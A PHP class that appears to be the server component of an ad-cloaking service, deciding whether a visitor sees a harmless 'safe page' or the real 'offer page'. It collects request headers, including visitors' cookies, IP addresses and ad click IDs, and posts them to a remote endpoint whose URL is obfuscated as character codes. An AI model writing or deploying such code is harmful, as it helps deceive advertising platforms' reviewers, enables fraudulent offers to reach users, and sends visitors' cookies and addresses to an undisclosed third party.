<?php

namespace app\services;


class CloakService{
    protected $campaign_id;
    protected $campaign_signature;

    public function __construct($campaign_id, $campaign_signature)
    {
        $this->campaign_id = $campaign_id;
        $this->campaign_signature = $campaign_signature;
    }
// ---------------------------------------------------
// DO NOT EDIT
// 如果返回 true 则需要去到安全页  如果返回false 则可以直接到offer页
    public function httpHandleResponse($response, $logToFile = true)
    {
        $decodedResponse = json_decode($response, true);
        if (is_array($decodedResponse) && array_key_exists('error', $decodedResponse)) {
            if ($logToFile) {
                $this->logToFile($decodedResponse['error'] . ' ' . $decodedResponse['message']);
            }
            // TODO 对于接口 返回404 放行通过 可能会因为接口有出现错误或者欠费 误判
            return false;
        } else {
            if (isset($decodedResponse[1]) && $decodedResponse[1] === false) {
                return true;
            }
            return false;
        }
    }


    public function httpRequestMakePayloadForJS($postData)
    {
        $campaignId = $this->campaign_id;
        $campaignSignature = $this->campaign_signature;
        if (!array_key_exists('q', $postData)) {
            return $postData;
        }

        $postData = $postData['q'];

        $payload = preg_split('@\|@', base64_decode($postData));

        $payload[1] = $campaignSignature;
        $payload[28] = 'pisccl40';
        $payload[29] = '0';

        return base64_encode(implode('|', $payload));
    }

    public function httpRequestMakePayload()
    {
        $campaignId = $this->campaign_id;
        $campaignSignature = $this->campaign_signature;
        $payload = [];
        array_push($payload, $campaignId, $campaignSignature);

        $h = $this->httpGetHeaders();

        foreach ($h as $k => $v) {
            array_push($payload, $v);
        }

        array_push($payload, 'f');

        for ($i = 0; $i < 14; $i++) {
            array_push($payload, md5($campaignSignature . uniqid($campaignId)));
        }

        $getKeys = array_keys($_GET);

        $gclid = 0;

        foreach ($getKeys as $key) {
            if (preg_match('@gclid|msclkid@i', $key)) {
                $gclid = $_GET[$key];
            }
        }

        $payload[] = $gclid;

        for ($i = 0; $i < 3; $i++) {
            array_push($payload, md5($campaignSignature . uniqid($campaignId)));
        }

        array_push($payload, $campaignSignature);

        for ($i = 0; $i < 1; $i++) {
            array_push($payload, md5($campaignSignature . uniqid($campaignId)));
        }

        array_push($payload, 'pisccl40');

        // Use LPR
        array_push($payload, '0');

        return base64_encode(implode('|', $payload));
    }

    public function httpRequestExec($metadata, $campaignId)
    {
        $headers = $this->httpGetAllHeaders();

        $ch = $this->httpRequestInitCall($campaignId);

        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'q=' . $metadata);

        curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);

        $http_response = curl_exec($ch);

        $http_status = curl_getinfo($ch);
        $http_code = $http_status['http_code'];

        if ($http_code != 200) {
            switch ($http_code) {
                case 400:
                    $message = 'Bad Request';
                    break;

                case 402:
                    $message = 'Payment Required';
                    break;

                case 417:
                    $message = 'Expectation Failed';
                    break;

                case 429:
                    $message = 'Request Throttled';
                    break;

                case 500:
                    $message = 'Internal Server Error';
                    break;

                default:
                    $message = '';
                    break;
            }
            $http_response = json_encode(['error' => $http_code, 'message' => $message]);
        }

        curl_close($ch);

        return $http_response;
    }

    protected function httpGetHeaders()
    {
        $h = ['HTTP_REFERER' => '', 'HTTP_USER_AGENT' => '', 'SERVER_NAME' => '', 'REQUEST_TIME' => '', 'QUERY_STRING' => ''];
        foreach ($h as $key => $value) {
            $h[$key] = array_key_exists($key, $_SERVER) ? $_SERVER[$key] : $value;
        }
        return $h;
    }

    protected function httpGetAllHeaders()
    {
        $headersToFind = [
            'HTTP_X_REAL_IP',
            'HTTP_DEVICE_STOCK_UA',
            'REMOTE_ADDR',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_OPERAMINI_PHONE_UA',
            'X_FB_HTTP_ENGINE',
            'HTTP_X_FB_HTTP_ENGINE',
            'REQUEST_SCHEME',
            'HEROKU_APP_DIR',
            'CONTEXT_DOCUMENT_ROOT',
            'X_PURPOSE',
            'HTTP_X_PURPOSE',
            'SCRIPT_FILENAME',
            'PHP_SELF',
            'SCRIPT_NAME',
            'HTTP_ACCEPT_ENCODING',
            'REQUEST_URI',
            'REQUEST_TIME_FLOAT',
            'QUERY_STRING',
            'HTTP_ACCEPT_LANGUAGE',
            'HTTP_CF_CONNECTING_IP',
            'HTTP_INCAP_CLIENT_IP',
            'PROFILE',
            'X_FORWARDED_FOR',
            'X_WAP_PROFILE',
            'HTTP_COOKIE',
            'WAP_PROFILE',
            'HTTP_REFERER',
            'HTTP_VIA',
            'HTTP_CLIENT_IP',
            'HTTP_X_REQUESTED_WITH',
            'HTTP_CONNECTION',
            'HTTP_USER_AGENT',
            'HTTP_HOST',
            'HTTP_ACCEPT',
            'HTTP_CF_CONNECTING_IP',
            'HTTP_X_SHOPIFY_CLIENT_IP',
        ];

        $headers = [];

        foreach ($headersToFind as $header) {
            if (!array_key_exists($header, $_SERVER)) {
                continue;
            }
            $key = 'X-LC-' . str_replace('_', '-', $header);
            $value = is_array($_SERVER[$header]) ? implode(',', $_SERVER[$header]) : $_SERVER[$header];
            $headers[] = $key . ':' . $value;
        }

        $headers[] = 'X-LC-SIG: ' . $this->campaign_signature;

        return $headers;

    }

    protected function httpRequestInitCall($campaignId)
    {
        $s = [104, 116, 116, 112, 115, 58, 47, 47, 108, 99, 106, 115, 99, 100, 110, 46, 99, 111, 109, 47, 100, 47];
        $u = '';
        foreach ($s as $v) {
            $u .= chr($v);
        }
        $u .= $campaignId;

        return curl_init($u);
    }

    protected function httpGetIPHeaders($returnList = false)
    {
        if (array_key_exists('HTTP_FORWARDED', $_SERVER)) {
            return str_replace('@for\=@', '', $_SERVER['HTTP_FORWARDED']);
        } else if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
            $ipList = array_values(array_filter(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])));

            if (sizeof($ipList) == 1) {
                return current($ipList);
            }

            if ($returnList) {
                return $ipList;
            }

            foreach ($ipList as $ip) {
                $ip = trim($ip);

                /**
                 * check if the value is anything other than an IP address
                 */
                if (!$this->httpIsValidIP($ip)) {
                    continue;
                }
            }
        } else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER["HTTP_CLIENT_IP"];
        } else if (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) {
            return $_SERVER['HTTP_CF_CONNECTING_IP'];
        } else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER["REMOTE_ADDR"];
        }

        return false;
    }

    protected function httpIsValidIP($ipAddress)
    {
        return (bool)filter_var($ipAddress, FILTER_VALIDATE_IP);
    }


    protected function isPHPVersionAcceptable()
    {
        if (PHP_MAJOR_VERSION == 5 && PHP_MINOR_VERSION < 4) {
            return 'Please update your PHP Version to PHP 5.4 or higher to use this application.';
        }

        return true;
    }

    protected function isCURLInstalled()
    {
        if (!in_array('curl', get_loaded_extensions())) {
            return 'This application requires that cURL be installed. Please install cURL to continue.';
        }

        return true;
    }

    protected function isJSONInstalled()
    {
        if (!function_exists('json_encode')) {
            return 'This application requires that the PHP be able to decode JSON. Please enable a JSON for PHP.';
        }

        return true;
    }

    protected function isDirectoryWritable()
    {
        if (!is_readable(dirname(__FILE__))) {
            return 'This application requires to be able to read to this directory for logging purposes. Please change permissions for this directory (' . (dirname(__FILE__)) . ') to continue.';
        }

        if (!is_writeable(dirname(__FILE__))) {
            return 'This application requires to be able to write to this directory for logging purposes. Please change permissions for this directory (' . (dirname(__FILE__)) . ') to continue.';
        }

        return true;
    }

    protected function isApplicationReadyToRun()
    {
        print 'Checking application environment...' . nl2br(PHP_EOL);
        $checks = [$this->isPHPVersionAcceptable(), $this->isCURLInstalled(), $this->isJSONInstalled(), $this->isDirectoryWritable()];
        $hasErrors = false;

        foreach ($checks as $check) {
            if (!is_bool($check)) {
                $hasErrors = true;

                print ' - ' . $check . nl2br(PHP_EOL);
            }
        }

        if (empty($hasErrors)) {
            print 'App ready to run!' . nl2br(PHP_EOL) . 'Set `$enableDebugging` to `false` to continue.';
        }

        die();
    }

    protected function logToFile($result)
    {
        $date = date('Y-m-d H:i:s.u');
        $filename = 'leadcloak-log-ur6fbvg2fur.log';

        $contents = "[{$date}] Failed: {$result} " . PHP_EOL;

        if (file_exists($filename) && !is_writable($filename)) {
            // ERROR
            return 'Error writing to log file';
        }

        return file_put_contents($filename, $contents, FILE_APPEND) ? true : false;
    }
}
